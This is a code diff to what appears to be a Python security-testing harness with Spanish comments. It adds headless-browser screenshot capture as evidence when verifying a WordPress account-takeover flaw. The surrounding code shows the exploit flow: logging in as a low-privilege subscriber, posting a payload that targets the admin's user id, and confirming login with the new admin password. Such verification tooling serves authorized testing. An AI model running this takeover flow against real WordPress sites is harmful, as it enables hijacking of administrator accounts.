@@ -261,6 +261,46 @@ class _Lab:
                 pass
 
 
+def _screenshot_authenticated(base_url: str, session, path: str) -> Optional[str]:
+    """Reusa las cookies de una requests.Session YA autenticada (via _wp_login) para abrir esa
+    misma sesion en un Chromium headless (Playwright) y capturar una foto REAL de la pagina --
+    evidencia visual, no solo un codigo HTTP. Mismo patron de degradacion honesta que
+    dynamic.browser_observe(): si Playwright no esta instalado o el navegador no arranca, devuelve
+    None sin romper la verificacion (la evidencia textual ya probada sigue siendo valida sin
+    captura). Devuelve la imagen como PNG codificado en base64, o None."""
+    try:
+        from playwright.sync_api import sync_playwright
+    except Exception:
+        return None
+    import base64
+    import tempfile
+    from urllib.parse import urlsplit
+    host = urlsplit(base_url).hostname or "127.0.0.1"
+    cookies = [{"name": c.name, "value": c.value, "domain": host, "path": "/"} for c in session.cookies]
+    fd, out_path = tempfile.mkstemp(suffix=".png")
+    os.close(fd)
+    try:
+        with sync_playwright() as pw:
+            browser = pw.chromium.launch(headless=True, args=["--no-sandbox"])
+            try:
+                ctx = browser.new_context(viewport={"width": 1280, "height": 900})
+                ctx.add_cookies(cookies)
+                page = ctx.new_page()
+                page.goto(base_url + path, wait_until="load", timeout=15000)
+                page.screenshot(path=out_path, full_page=True)
+            finally:
+                browser.close()
+        with open(out_path, "rb") as f:
+            return base64.b64encode(f.read()).decode("ascii")
+    except Exception:
+        return None
+    finally:
+        try:
+            os.unlink(out_path)
+        except OSError:
+            pass
+
+
 def _wp_login(base_url: str, user: str, password: str, timeout: float = 15.0):
     """Login real por cookie de WordPress (wp-login.php). Devuelve una requests.Session logueada,
     o None si no hay cookie de sesion (login fallido). Requiere la libreria `requests` (pwntools ya
@@ -397,6 +437,9 @@ def verify_wordpress_account_takeover(
             res.detail = "no se pudo iniciar sesion como el usuario de bajo privilegio"
             return res
         res.logs.append(f"login subscriber: OK ({sub_user})")
+        shot = _screenshot_authenticated(base_url, sess, "/wp-admin/profile.php")
+        if shot:
+            res.evidence["screenshot_before_subscriber_png_b64"] = shot
 
         payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
         payload[id_param] = admin_id
@@ -437,6 +480,10 @@ def verify_wordpress_account_takeover(
                                             f"'{new_pass}' funciono (cookie wordpress_logged_in_* "
                                             f"presente tras el POST a wp-login.php)")
             step("VERIFICADO: el login como admin con la password nueva funciono.")
+            step("capturando pantalla del panel de WordPress ya como admin (evidencia visual)...")
+            shot = _screenshot_authenticated(base_url, confirm, "/wp-admin/")
+            if shot:
+                res.evidence["screenshot_admin_dashboard_png_b64"] = shot
             return res
 
         # si no hay pass_param (solo email, p.ej.), confirma por wp-cli leyendo el email actual
